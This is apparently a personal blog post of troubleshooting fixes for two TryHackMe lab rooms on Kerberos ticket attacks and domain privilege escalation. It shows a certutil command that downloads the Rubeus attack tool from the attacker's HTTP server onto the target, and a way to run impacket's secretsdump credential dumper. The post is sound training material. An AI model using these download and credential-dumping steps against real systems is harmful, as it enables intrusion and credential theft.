---
layout: post
title:  "TryHackMe – fixes"
date:   2025-01-12 14:10:00 +1000
categories: blog
tags: [cloud, offsec]
subtitle: "Fighting old battles again?"
image: Screenshot-2025-01-13-09-42-06-TryHackMe-TAbdiukov.png
---

![Screenshot-2025-01-13-09-42-06-TryHackMe-TAbdiukov.png](Screenshot-2025-01-13-09-42-06-TryHackMe-TAbdiukov.png)

List of issues encountered and their corresponding bypasses / fixes

## Attacking Kerberos - Harvesting & Brute-Forcing Tickets w/ Rubeus

The middleman machine's RDP never accepts the password provided. 

Luckily, an SSH service is running on the host, atypical for Windows.

First, let's connect via SSH and confirm connectivity
```
ssh Administrator@<KerberosServer>
Password: P@$$W0rd
```

Yay! However, if SSH is utilized, there will be problems compiling software or getting Rubeus on the host as it's not connected to the internet.

Luckily, someone compiled software we need: [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

On AttackBox, open terminal tab and run the following commands,
```
mkdir share && cd share
git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
python3 -m http.server 8000
```

As a sanity-check, on AttackBox, open Firefox and confirm the Rubeus download URL. It should be,
```
http://<AttackBox_IP>:8000/Ghostpack-CompiledBinaries/Rubeus.exe
```

Then, we can work around connectivity issues using an old OffSec OSCP trick to infiltrate/exfiltrate data. Back to KerberosServer SSH, run:
```
cd Downloads
certutil.exe -urlcache -split -f http://<AttackBox_IP>:8000/Ghostpack-CompiledBinaries/Rubeus.exe Rubeus.exe
```

You should then see a request in the http.server logs. Now you can run Rubeus. Luckily, all required .Net Framework packages are already on the host.

## Attacktive Directory - Elevating Privileges within the Domain

I encountered issues with the operation of `secretsdump.py` (stock or modified). Maybe it's related to AttackBox, maybe it's related to impacket. However, I found an easy workaround to the problem,

```
apt install python3-impacket
```
 
you should see,

```
After this operation, 27.0 MB of additional disk space will be used.
Do you want to continue? [Y/n] y
```

now you can proceed as follows,

```
impacket-secretsdump <desired-secretsdump.py-command>
```


----------------------
Tim Abdiukov
